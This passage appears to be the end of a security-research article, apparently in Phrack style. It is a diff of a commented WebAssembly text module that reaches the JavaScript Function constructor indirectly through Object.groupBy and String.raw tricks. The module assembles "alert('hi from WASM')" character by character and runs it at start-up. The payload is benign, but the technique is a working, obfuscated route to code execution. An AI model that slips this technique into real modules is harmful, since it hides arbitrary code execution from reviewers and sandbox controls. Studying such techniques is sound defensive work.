+  ;; later. We use Object.groupBy under the hood, which wraps values in
+  ;; lists. So we're constructing something like [['f'],['o'],['o']].
+  ;; Luckily this doesn't matter later on because the String.raw behavior.
+  (func $add_charcode_to_obj (param $obj externref) (param $c i32)
+    (call $add_value_to_obj
+      (local.get $obj)
+      (call $chr (local.get $c))
+    )
+  )
+
+  ;; Turns a list such as [["a"],["b"],["c"],["d"]] into ["a0bcd"]
+  ;; (yes, the "0" is added after the first character, due to how we use
+  ;; Object.groupBy) (yes, it returns an array, but this is fine as the
+  ;; implicit .toString gives the string)
+  (func $list_to_string (param $list externref) (result externref)
+    (local $arrwithobj externref)
+    (local $innerobj externref)
+    (local $res externref)
+
+    ;; Create an object with the key "raw", with as value our input list
+    ;; because String.raw uses this key to build the string. (groupBy wraps
+    ;; grouped elements in a list, but they all group to the same key so it
+    ;; gives back the original list)
+    (global.get $s_raw)
+    (global.set $g_val_e)
+    (call $groupBy_i (local.get $list) (ref.func $return_val_e))
+    (local.set $res)
+
+    ;; This is just a way to get an array with a single object. We need
+    ;; this as we want to give the object as a parameter to String.raw(),
+    ;; but it needs to be wrapped in an array for the Object.groupBy trick.
+    (call $values (call $getOwnPropertyDescriptors (local.get $res)))
+    (local.set $arrwithobj)
+
+    ;; Grab the inner object, for the purpose of modifying it
+    (call $array_get_nth_element (local.get $arrwithobj) (i32.const 0))
+    (local.set $innerobj)
+
+    ;; Merge 'res' into it (our object with the raw key)
+    (call $assign (local.get $innerobj) (local.get $res))
+
+    ;; Now we can invoke String.raw via Object.groupBy
+    (call $groupBy_e
+      (local.get $arrwithobj) (global.get $String_constructor_raw)
+    )
+
+    ;; The result is in the key of the returned object, so extract that
+    (call $keys)
+  )
+
+  ;; Globals used by $array_index_of and $save_idx_if_length_equals
+  (global $g_wanted_elem (mut i32) (i32.const 999))
+  (global $g_wanted_length (mut i32) (i32.const 0))
+  (global $g_obtained_idx (mut i32) (i32.const 999))
+
+  ;; Callback to be used with func $array_index_of
+  (func $save_idx_if_equals (param $elem i32) (param $idx i32)
+    (local.get $elem)
+    (global.get $g_wanted_elem)
+    i32.eq
+    ;; if($elem == $g_wanted_elem) $g_obtained_idx = idx;
+    (if
+      (then
+        (local.get $idx)
+        (global.set $g_obtained_idx)
+      )
+    )
+  )
+
+  ;; Callback to be used with func $get_index_for_element_with_length
+  (func $save_idx_if_length_equals (param $elem externref) (param $idx i32)
+    ;; Get the descriptor of the 'length' prop, then get its 'value'
+    (call $array_get_nth_element_i
+      (call $values
+        (call $getOwnPropertyDescriptor
+          (local.get $elem) (global.get $s_length)
+        )
+      )
+      (global.get $OFF_VALUE) ;; The index of 'value' in prop descriptors
+    )
+
+    ;; if(len == $g_wanted_length) $g_obtained_idx = idx;
+    (global.get $g_wanted_length)
+    i32.eq
+    (if
+      (then
+        (local.get $idx)
+        (global.set $g_obtained_idx)
+      )
+    )
+  )
+
+  ;; Get the index of the $needle in $arr. Used later to obtain OFF_VALUE
+  ;; (in property descriptor)
+  (func $array_index_of (param $arr externref) (param $needle i32)
+                        (result i32)
+    (local.get $needle)
+    (global.set $g_wanted_elem)
+
+    (call $groupBy_i
+      (local.get $arr)
+      (ref.func $save_idx_if_equals)
+    )
+    drop
+
+    (global.get $g_obtained_idx)
+  )
+
+
+  ;; The order of properties in built-in objects is implementation-specific
+  ;; Luckily, we can find out the indices of some props we need, by their
+  ;; unique name lengths
+  (func $get_index_for_element_with_length (param $arr externref)
+                                           (param $wanted_length i32)
+                                           (result i32)
+    ;; Object.groupBy($arr, $save_idx_if_length_equals)
+    (local.get $wanted_length)
+    (global.set $g_wanted_length)
+
+    (call $groupBy_i
+      (local.get $arr)
+      (ref.func $save_idx_if_length_equals)
+    )
+    drop
+
+    (global.get $g_obtained_idx)
+  )
+
+  ;; Build the payload
+  (func $build_string (result externref)
+    (local $accum externref)
+
+    ;; accum = {}
+    ;; There are probably cleaner ways but we just make a Function("B").
+    ;; This is a clean object that has no own keys (which is what we need)
+    (call $constructor (call $chr (i32.const 0x42)))
+    (local.set $accum)
+
+    ;; Start with "0;" because a "0" is injected at index 1
+    ;; (due to String.raw also receiving the second argument which
+    ;; Object.groupBy passes to its callback (idx))
+    ;; The final result is "00;alert('hi from WASM')"
+    (call $add_charcode_to_obj (local.get $accum) (i32.const 0x30))
+    (call $add_charcode_to_obj (local.get $accum) (i32.const 0x3b))
+
+    ;; alert('
+    (call $add_charcode_to_obj (local.get $accum) (i32.const 0x61))
+    (call $add_charcode_to_obj (local.get $accum) (i32.const 0x6c))
+    (call $add_charcode_to_obj (local.get $accum) (i32.const 0x65))
+    (call $add_charcode_to_obj (local.get $accum) (i32.const 0x72))
+    (call $add_charcode_to_obj (local.get $accum) (i32.const 0x74))
+    (call $add_charcode_to_obj (local.get $accum) (i32.const 0x28))
+    (call $add_charcode_to_obj (local.get $accum) (i32.const 0x27))
+
+    ;; hi from WASM
+    (call $add_charcode_to_obj (local.get $accum) (i32.const 0x68))
+    (call $add_charcode_to_obj (local.get $accum) (i32.const 0x69))
+    (call $add_charcode_to_obj (local.get $accum) (i32.const 0x20))
+    (call $add_charcode_to_obj (local.get $accum) (i32.const 0x66))
+    (call $add_charcode_to_obj (local.get $accum) (i32.const 0x72))
+    (call $add_charcode_to_obj (local.get $accum) (i32.const 0x6f))
+    (call $add_charcode_to_obj (local.get $accum) (i32.const 0x6d))
+    (call $add_charcode_to_obj (local.get $accum) (i32.const 0x20))
+    (call $add_charcode_to_obj (local.get $accum) (i32.const 0x57))
+    (call $add_charcode_to_obj (local.get $accum) (i32.const 0x41))
+    (call $add_charcode_to_obj (local.get $accum) (i32.const 0x53))
+    (call $add_charcode_to_obj (local.get $accum) (i32.const 0x4d))
+
+    ;; ')
+    (call $add_charcode_to_obj (local.get $accum) (i32.const 0x27))
+    (call $add_charcode_to_obj (local.get $accum) (i32.const 0x29))
+
+
+    ;; Convert into list
+    (call $values (local.get $accum))
+    (call $list_to_string)
+  )
+
+  (func $main
+    (local $payload externref)
+
+    ;; Obtain the string 'length'
+    ;; Luckily it is the only own property of an empty array, hence index 0
+    (call $array_get_nth_element
+      (call $getOwnPropertyNames (call $values (global.get $prototype)))
+      (i32.const 0)
+    )
+    (global.set $s_length)
+
+    ;; Obtain the offset of 'value' in property descriptors. We can't use
+    ;; $get_index_for_element_with_length here, as it uses 'value'
+    ;; internally. Instead, we take a look which of the properties of a
+    ;; property descriptor of 'length' has the value 6, e.g.:
+    ;;  Object.values(Object.getOwnPropertyDescriptor('length', 'length'));
+    ;;  gives: [ 6, false, false, false ]
+    ;; The one at index (0 in the example) is the length, so store that
+    ;; index for future use.
+    (call $array_index_of
+      (call $values
+        (call $getOwnPropertyDescriptor
+          (global.get $s_length)
+          (global.get $s_length)
+        )
+      )
+      (i32.const 6)
+    )
+    (global.set $OFF_VALUE)
+
+    ;; Obtain the offset of 'constructor' in the Object prototype
+    (call $get_index_for_element_with_length
+      ;; Object.getOwnPropertyNames({}.constructor.prototype)
+      (call $getOwnPropertyNames (global.get $prototype))
+      (i32.const 11) ;; "constructor".length
+    )
+    (global.set $OFF_CONSTRUCTOR)
+
+    ;; Get the string 'constructor'
+    ;; In addition to the offset obtained above, we need this as a string
+    ;; because the index of 'constructor' in Object's property list is
+    ;; different from the index of 'constructor' in String's property list.
+    (call $array_get_nth_element
+      (call $getOwnPropertyNames (global.get $prototype))
+      (global.get $OFF_CONSTRUCTOR)
+    )
+    (global.set $s_constructor)
+
+    ;; Get String.prototype.constructor
+    ;; (via the string "constructor" but could be any string)
+    (call $object_get_named_property
+      (call $getPrototypeOf (global.get $s_constructor))
+      (global.get $s_constructor)
+    )
+    (global.set $String_constructor)
+
+    ;; Obtain the idxs of 'fromCharCode' and 'raw' in list of String's keys
+    (call $get_index_for_element_with_length
+      ;; Object.getOwnPropertyNames(String)
+      (call $getOwnPropertyNames (global.get $String_constructor))
+      (i32.const 12) ;; "fromCharCode".length
+    )
+    (global.set $OFF_FROMCHARCODE)
+    (call $get_index_for_element_with_length
+      ;; Object.getOwnPropertyNames(String)
+      (call $getOwnPropertyNames (global.get $String_constructor))
+      (i32.const 3) ;; "raw".length
+    )
+    (global.set $OFF_RAW)
+
+    ;; Get String.constructor.fromCharCode and String.constructor.raw
+    (call $object_get_nth_property
+      (global.get $String_constructor) (global.get $OFF_FROMCHARCODE)
+    )
+    (global.set $String_constructor_fromCharCode)
+    (call $object_get_nth_property
+      (global.get $String_constructor) (global.get $OFF_RAW)
+    )
+    (global.set $String_constructor_raw)
+
+    ;; Get the string 'raw' from the String constructor
+    ;; (we also need it to construct the parameter of String.raw)
+    (call $array_get_nth_element
+      (call $getOwnPropertyNames (global.get $String_constructor))
+      (global.get $OFF_RAW)
+    )
+    (global.set $s_raw)
+
+    ;; Build the payload. Returns wrapped in array,
+    ;; e.g. [ "00;alert('hi from WASM')" ]
+    (call $build_string)
+    (local.set $payload)
+
+    ;; Make our function and call it using groupBy!!
+    (call $groupBy_e
+      ;; Use payload as a convenient array with length 1 to use for groupBy
+      (local.get $payload)
+      (call $constructor
+        (local.get $payload)
+      )
+    )
+    drop ;; ignore return value
+  )
+  (start $main)
+)
+
+
+|=[ EOF ]=---------------------------------------------------------------=|
